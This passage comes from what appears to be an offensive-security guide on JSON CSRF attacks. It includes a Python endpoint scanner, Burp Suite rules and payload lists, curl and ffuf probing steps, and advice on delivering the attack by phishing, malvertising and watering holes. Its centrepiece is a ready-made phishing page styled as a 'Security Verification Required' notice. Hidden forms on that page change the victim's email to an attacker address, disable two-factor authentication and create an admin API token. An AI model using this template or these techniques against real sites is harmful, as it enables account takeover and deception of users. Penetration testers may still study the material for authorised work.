        os.makedirs(output_dir, exist_ok=True)
    
    CONTENT_TYPES = [
        'application/json',
        'text/plain',
        'application/x-www-form-urlencoded',
        'multipart/form-data',
        'text/html',
        'text/xml',
        'application/octet-stream',
        'text/csv',
    ]
    
    ORIGINS = [
        None,               # Same-origin
        'https://evil.com',  # Cross-origin
        'null',              # Null origin
    ]
    
    TOKEN_TESTS = [
        ('removed', {}),
        ('empty', {'X-CSRF-Token': ''}),
        ('null_string', {'X-CSRF-Token': 'null'}),
        ('undefined', {'X-CSRF-Token': 'undefined'}),
    ]

    def test_endpoint(self, endpoint):
        url = urljoin(self.base + '/', endpoint.lstrip('/'))
        results = []
        
        # Test 1: Content-Type variations
        for ct in self.CONTENT_TYPES:
            for origin in self.ORIGINS:
                headers = {'Content-Type': ct}
                if origin:
                    headers['Origin'] = origin
                
                try:
                    r = self.session.post(
                        url, data='{"csrf_test":"probe"}',
                        headers=headers, timeout=10,
                        allow_redirects=False
                    )
                    
                    if r.status_code in [200, 201, 204, 302]:
                        finding = {
                            'url': url,
                            'technique': 'content_type_bypass',
                            'content_type': ct,
                            'origin': origin or 'same-origin',
                            'status': r.status_code,
                            'severity': 'HIGH' if ct in ['text/plain', 'application/x-www-form-urlencoded'] else 'MEDIUM'
                        }
                        results.append(finding)
                        print(f"  [!] {endpoint} | CT: {ct} | Origin: {origin} | {r.status_code}")
                except:
                    pass
        
        # Test 2: CSRF token bypass
        for test_name, test_headers in self.TOKEN_TESTS:
            headers = {'Content-Type': 'application/json'}
            headers.update(test_headers)
            try:
                r = self.session.post(
                    url, json={'csrf_test': 'probe'},
                    headers=headers, timeout=10,
                    allow_redirects=False
                )
                if r.status_code in [200, 201, 204, 302]:
                    finding = {
                        'url': url,
                        'technique': f'token_bypass_{test_name}',
                        'status': r.status_code,
                        'severity': 'HIGH'
                    }
                    results.append(finding)
                    print(f"  [!] {endpoint} | Token {test_name} | {r.status_code}")
            except:
                pass
        
        return results

    def scan(self, endpoints, threads=10):
        print(f"[*] Scanning {len(endpoints)} endpoints on {self.base}")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self.test_endpoint, ep): ep for ep in endpoints}
            for future in concurrent.futures.as_completed(futures):
                self.findings.extend(future.result())
        
        # Save results
        report_path = os.path.join(self.output_dir, 'report.json')
        with open(report_path, 'w') as f:
            json.dump({
                'target': self.base,
                'scan_date': datetime.now().isoformat(),
                'total_findings': len(self.findings),
                'findings': self.findings
            }, f, indent=2)
        
        print(f"\n[*] {len(self.findings)} findings saved to {report_path}")
        return self.findings

if __name__ == '__main__':
    base = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com'
    cookies = {'session': sys.argv[2] if len(sys.argv) > 2 else 'VICTIM_SESSION'}
    
    endpoints = [
        '/api/user/email', '/api/user/password', '/api/user/profile',
        '/api/user/role', '/api/settings', '/api/account',
        '/api/tokens', '/api/webhooks', '/api/transfer',
        '/api/admin/users', '/api/admin/config',
        '/graphql', '/api/v1/users/me',
    ]
    
    analyzer = CSRFAnalyzer(base, cookies)
    analyzer.scan(endpoints)
```
::

### Burp Suite Integration

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Match & Replace Rules"}
  ```bash
  # Burp Proxy → Options → Match and Replace
  # Configure these rules to automatically test CSRF weaknesses

  # Rule 1: Remove CSRF token header
  Type: Request header
  Match regex: ^X-CSRF-Token:.*$
  Replace: (empty)
  Comment: Strip CSRF token header

  # Rule 2: Remove CSRF token from body
  Type: Request body
  Match regex: "csrf_token"\s*:\s*"[^"]*"\s*,?
  Replace: (empty)
  Comment: Remove CSRF token from JSON body

  # Rule 3: Change Content-Type to text/plain
  Type: Request header
  Match: Content-Type: application/json
  Replace: Content-Type: text/plain
  Comment: Test text/plain acceptance

  # Rule 4: Remove Origin header
  Type: Request header
  Match regex: ^Origin:.*$
  Replace: (empty)
  Comment: Test without Origin

  # Rule 5: Set null Origin
  Type: Request header
  Match regex: ^Origin:.*$
  Replace: Origin: null
  Comment: Test null origin acceptance

  # Rule 6: Remove Referer header
  Type: Request header
  Match regex: ^Referer:.*$
  Replace: (empty)
  Comment: Test without Referer

  # Rule 7: Remove X-Requested-With
  Type: Request header
  Match regex: ^X-Requested-With:.*$
  Replace: (empty)
  Comment: Strip XMLHttpRequest header

  # Rule 8: Add cross-origin Origin
  Type: Request header
  Match regex: ^Origin:.*$
  Replace: Origin: https://evil.com
  Comment: Test cross-origin acceptance
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Intruder Configuration"}
  ```bash
  # Burp Intruder setup for CSRF token fuzzing

  # Position: Replace the CSRF token value
  POST /api/user/email HTTP/1.1
  Host: target.com
  Content-Type: application/json
  Cookie: session=VALID
  X-CSRF-Token: §FUZZ§

  {"email":"test@test.com"}

  # Payload set 1: Token bypass values
  (empty string)
  null
  undefined
  true
  false
  0
  1
  []
  {}
  ""
  None
  nil
  NaN
  Infinity
  -1
  AAAA

  # Payload set 2: Content-Type fuzzing
  # Change Intruder position to Content-Type header value:
  application/json
  text/plain
  application/x-www-form-urlencoded
  multipart/form-data
  text/html
  text/xml
  application/xml
  text/csv
  application/octet-stream
  application/json; charset=utf-8
  application/json; charset=utf-7
  application/json; charset=iso-8859-1
  TEXT/PLAIN
  Text/Plain
  text/plain; charset=utf-8
  application/x-json
  application/hal+json
  application/vnd.api+json
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Repeater Testing Workflow"}
  ```bash
  # Step-by-step Burp Repeater CSRF testing

  # 1. Capture legitimate request in Proxy
  # 2. Send to Repeater (Ctrl+R)

  # 3. Test: Remove all CSRF-related headers/params
  # Delete: X-CSRF-Token, X-XSRF-Token headers
  # Delete: _token, csrf_token from JSON body
  # → Send → Check if request succeeds

  # 4. Test: Change Content-Type
  # Replace: Content-Type: application/json
  # With:    Content-Type: text/plain
  # → Send → Check if request succeeds

  # 5. Test: Add cross-origin Origin
  # Add: Origin: https://evil.com
  # → Send → Check if request succeeds

  # 6. Test: Null origin
  # Add: Origin: null
  # → Send → Check if request succeeds

  # 7. Test: Remove Referer
  # Delete: Referer header
  # → Send → Check if request succeeds

  # 8. Test: Method override
  # Change to GET with ?_method=POST
  # → Send → Check if request succeeds

  # 9. If any test succeeds:
  # Right-click → Engagement tools → Generate CSRF PoC
  # Modify generated PoC for JSON body:
  #   - Change enctype to text/plain
  #   - Adjust input name/value for JSON format
  #   - Add auto-submit JavaScript
  ```
  :::
::

## Delivery & Social Engineering

::card-group
  ::card
  ---
  title: Phishing Email
  icon: i-lucide-mail
  ---
  Embed exploit link in crafted phishing email. Use URL shorteners or redirect services to obscure the attacker domain. Most effective for targeted attacks.
  ::

  ::card
  ---
  title: Watering Hole
  icon: i-lucide-droplets
  ---
  Inject exploit into a website commonly visited by target users. Forum posts, blog comments, or compromised partner sites serve as delivery platforms.
  ::

  ::card
  ---
  title: QR Code Delivery
  icon: i-lucide-qr-code
  ---
  Generate QR codes linking to exploit pages. Effective for physical delivery through printed materials or display screens in target environments.
  ::

  ::card
  ---
  title: Malvertising
  icon: i-lucide-megaphone
  ---
  Purchase ad space on platforms frequented by target users. JavaScript ad creatives execute CSRF payloads when the ad renders in the victim's browser.
  ::

  ::card
  ---
  title: Instant Messaging
  icon: i-lucide-message-circle
  ---
  Send exploit links via Slack, Teams, Discord, or other messaging platforms. Link previews may trigger the exploit in some cases.
  ::

  ::card
  ---
  title: Document Embedding
  icon: i-lucide-file-text
  ---
  Embed HTML exploit in Office documents, PDFs, or calendar invitations that open in browser-based viewers.
  ::
::

::code-collapse
```html
<!-- ================================================ -->
<!-- STEALTH DELIVERY TEMPLATE                        -->
<!-- Disguised as legitimate page while executing CSRF -->
<!-- ================================================ -->

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="referrer" content="no-referrer">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account Security Notice</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
           background: #f5f5f5; color: #333; }
    .container { max-width: 600px; margin: 40px auto; padding: 20px; }
    .card { background: white; border-radius: 12px; padding: 40px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
    .icon { font-size: 48px; margin-bottom: 20px; }
    h1 { font-size: 22px; margin-bottom: 10px; }
    p { color: #666; margin-bottom: 20px; line-height: 1.6; }
    .btn { display: inline-block; background: #2563eb; color: white;
           padding: 14px 28px; border-radius: 8px; text-decoration: none;
           font-weight: 600; cursor: pointer; border: none; font-size: 16px;
           transition: background 0.2s; }
    .btn:hover { background: #1d4ed8; }
    .progress { display: none; margin-top: 20px; }
    .progress-bar { height: 4px; background: #e5e7eb; border-radius: 2px;
                    overflow: hidden; }
    .progress-fill { height: 100%; background: #2563eb; width: 0%;
                     transition: width 2s ease; }
    .footer { text-align: center; margin-top: 20px; color: #999; font-size: 12px; }
  </style>
</head>
<body>

<div class="container">
  <div class="card">
    <div class="icon">🔒</div>
    <h1>Security Verification Required</h1>
    <p>We detected unusual activity on your account. Please verify your identity to continue accessing your account securely.</p>
    <button class="btn" onclick="verify()">Verify My Identity</button>
    <div class="progress" id="progress">
      <p style="margin-bottom:10px;font-size:14px;">Verifying your identity...</p>
      <div class="progress-bar">
        <div class="progress-fill" id="fill"></div>
      </div>
    </div>
  </div>
  <div class="footer">
    This is an automated security notification. Ref: SEC-2024-#8291
  </div>
</div>

<!-- Hidden attack infrastructure -->
<iframe name="s1" style="display:none"></iframe>
<iframe name="s2" style="display:none"></iframe>
<iframe name="s3" style="display:none"></iframe>

<form id="f1" action="https://target.com/api/user/email" method="POST"
      enctype="text/plain" target="s1" style="display:none">
  <input name='{"email":"attacker@evil.com","p":"' value='"}' type="hidden">
</form>

<form id="f2" action="https://target.com/api/user/2fa/disable" method="POST"
      enctype="text/plain" target="s2" style="display:none">
  <input name='{"confirm":true,"p":"' value='"}' type="hidden">
</form>

<form id="f3" action="https://target.com/api/tokens" method="POST"
      enctype="text/plain" target="s3" style="display:none">
  <input name='{"name":"security-check","scope":"admin","p":"' value='"}' type="hidden">
</form>

<script>
function verify() {
  document.querySelector('.btn').style.display = 'none';
  document.getElementById('progress').style.display = 'block';
  
  setTimeout(() => {
    document.getElementById('fill').style.width = '100%';
  }, 100);
  
  // Execute CSRF chain
  document.getElementById('f1').submit();
  setTimeout(() => document.getElementById('f2').submit(), 500);
  setTimeout(() => document.getElementById('f3').submit(), 1000);
  
  // Redirect to target after "verification"
  setTimeout(() => {
    window.location.href = 'https://target.com/dashboard?verified=true';
  }, 2500);
}

// Optional: Auto-fire without click (remove if user interaction desired)
// window.onload = () => setTimeout(verify, 1500);
</script>

</body>
</html>
```
::

## Exploitation Decision Methodology

::steps{level="4"}

#### Identify State-Changing JSON Endpoints

```bash
# Proxy all traffic through Burp Suite during authenticated browsing
# Filter for POST/PUT/PATCH/DELETE with JSON bodies
# Focus on: email changes, password updates, role modifications,
# transfers, token creation, webhook registration, account deletion

# Automated discovery:
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=VALID" -d '{}' -mc 200,201,204,400,422
```

#### Test CSRF Token Enforcement

```bash
# For each identified endpoint:
# 1. Replay request without CSRF token
# 2. Replay with empty/null/malformed token
# 3. Replay with token from different user
# 4. Replay with expired token
# If any succeeds → token bypass confirmed
```

#### Test Content-Type Acceptance

```bash
# Test if endpoint accepts non-JSON content types:
for ct in "text/plain" "application/x-www-form-urlencoded"; do
  curl -X POST https://target.com/api/endpoint \
    -H "Content-Type: $ct" \
    -H "Cookie: session=VALID" \
    -d '{"test":"probe"}'
done
# If accepted → form-based CSRF feasible
```

#### Test Origin/Referer Validation

```bash
# Test cross-origin, null origin, missing referer
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: text/plain" \
  -H "Origin: null" \
  -H "Cookie: session=VALID" \
  -d '{"test":"probe"}'
# If accepted → origin bypass confirmed
```

#### Determine SameSite Cookie Behavior

```bash
curl -sI https://target.com/ | grep -i "set-cookie"
# None → Full CSRF
# Lax → Top-level navigation + method override, or 2-min window
# Strict → Need same-site XSS or WebSocket
```

#### Generate Targeted PoC

```bash
python3 csrf_json_generator.py \
  -u "https://target.com/api/vulnerable-endpoint" \
  -d '{"email":"attacker@evil.com"}' \
  -t all -o exploit
# Test each generated PoC to confirm exploitability
```

#### Validate Impact & Document

```bash
# Host PoC on attacker server
python3 -m http.server 8080

# Open in browser with victim session
# Verify state change occurred on target
# Document: request/response, reproducibility, business impact
```
::

## Tools & Resources

::card-group
  ::card
  ---
  title: Burp Suite Professional
  icon: i-lucide-shield-check
  to: https://portswigger.net/burp/pro
  target: _blank
  ---
  Primary interception proxy for CSRF testing. Use Repeater for manual testing, Intruder for token fuzzing, and built-in CSRF PoC generator.
  ::

  ::card
  ---
  title: OWASP ZAP
  icon: i-lucide-search
  to: https://www.zaproxy.org/
  target: _blank
  ---
  Free alternative to Burp Suite with CSRF scanner plugins. Active scan rules detect missing CSRF tokens and SameSite cookie misconfigurations.
  ::

  ::card
  ---
  title: XSRFProbe
  icon: i-lucide-bug
  to: https://github.com/0xInfection/XSRFProbe
  target: _blank
  ---
  Dedicated CSRF/XSRF audit and exploitation toolkit. Automated detection of anti-CSRF token weaknesses, token analysis, and PoC generation.
  ::

  ::card
  ---
  title: Bolt (CSRF Scanner)
  icon: i-lucide-zap
  to: https://github.com/s0md3v/Bolt
  target: _blank
  ---
  CSRF vulnerability scanner focusing on token detection, origin/referer validation testing, and SameSite cookie analysis.
  ::

  ::card
  ---
  title: ffuf
  icon: i-lucide-terminal
  to: https://github.com/ffuf/ffuf
  target: _blank
  ---
  Fast web fuzzer for API endpoint discovery, parameter fuzzing, and content-type brute-forcing during CSRF reconnaissance.
  ::

  ::card
  ---
  title: nuclei
  icon: i-lucide-scan
  to: https://github.com/projectdiscovery/nuclei
  target: _blank
  ---
  Template-based vulnerability scanner with community CSRF detection templates. Custom templates for JSON-specific CSRF testing.
  ::

  ::card
  ---
  title: httpx
  icon: i-lucide-globe
  to: https://github.com/projectdiscovery/httpx
  target: _blank
  ---
  HTTP toolkit for bulk probing endpoints, header analysis, content-type acceptance testing, and response comparison across targets.
  ::

  ::card
  ---
  title: subfinder
  icon: i-lucide-layers
  to: https://github.com/projectdiscovery/subfinder
  target: _blank
  ---
  Subdomain discovery tool for identifying potential subdomain takeover targets and same-site XSS vectors for SameSite cookie bypass.
  ::

  ::card
  ---
  title: subjack
  icon: i-lucide-anchor
  to: https://github.com/haccer/subjack
  target: _blank
  ---
  Subdomain takeover detection tool. Claimed subdomains provide legitimate Origin headers for CSRF attacks bypassing origin validation.
  ::

  ::card
  ---
  title: mitmproxy
  icon: i-lucide-network
  to: https://mitmproxy.org/
  target: _blank
  ---
  Scriptable HTTP/HTTPS proxy for automated request modification. Python scripting enables custom CSRF token stripping and content-type manipulation.
  ::

  ::card
  ---
  title: CyberChef
  icon: i-lucide-chef-hat
  to: https://gchq.github.io/CyberChef/
  target: _blank
  ---
  Data encoding/decoding tool for crafting base64 payloads, URL encoding JSON bodies, and analyzing CSRF tokens for patterns.
  ::

  ::card
  ---
  title: Postman / Insomnia
  icon: i-lucide-send
  to: https://www.postman.com/
  target: _blank
  ---
  API testing clients for manual endpoint probing, content-type testing, and token manipulation during CSRF assessment.
  ::
::

### Reference Materials

::card-group
  ::card
  ---
  title: "OWASP CSRF Prevention Cheat Sheet"
  icon: i-lucide-book-open
  to: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
  target: _blank
  ---
  Comprehensive defense reference — understand protections to identify weaknesses and bypass opportunities.
  ::

  ::card
  ---
  title: "PortSwigger CSRF Academy"
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/csrf
  target: _blank
  ---
  Interactive labs covering SameSite bypass, token validation flaws, Referer-based defenses, and JSON CSRF exploitation.
  ::

  ::card
  ---
  title: "CORS and SameSite Explained"
  icon: i-lucide-file-text
  to: https://web.dev/articles/samesite-cookies-explained
  target: _blank
  ---
  Google's technical reference on SameSite cookie behavior, cross-site vs same-site definitions, and browser implementation details.
  ::

  ::card
  ---
  title: "Fetch Standard - CORS Protocol"
  icon: i-lucide-file-code
  to: https://fetch.spec.whatwg.org/#http-cors-protocol
  target: _blank
  ---
  Official specification defining simple requests, preflight conditions, and content-type restrictions exploited in JSON CSRF attacks.
  ::

  ::card
  ---
  title: "HackTricks - CSRF"
  icon: i-lucide-skull
  to: https://book.hacktricks.wiki/en/pentesting-web/csrf-cross-site-request-forgery.html
  target: _blank
  ---
  Community-driven exploitation reference with practical bypass techniques, payload examples, and real-world case studies.
  ::

  ::card
  ---
  title: "PayloadsAllTheThings - CSRF"
  icon: i-lucide-database
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
  target: _blank
  ---
  Extensive payload repository with ready-to-use CSRF templates, content-type bypass payloads, and framework-specific exploitation vectors.
  ::

  ::card
  ---
  title: "MDN - Content-Type"
  icon: i-lucide-book-marked
  to: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Type
  target: _blank
  ---
  Mozilla documentation on Content-Type header behavior, MIME type definitions, and browser handling of form submissions.
  ::

  ::card
  ---
  title: "Chrome SameSite Updates"
  icon: i-lucide-chrome
  to: https://www.chromium.org/updates/same-site/
  target: _blank
  ---
  Chromium project documentation on SameSite cookie enforcement changes, Lax+POST temporary exceptions, and implementation timeline.
  ::
::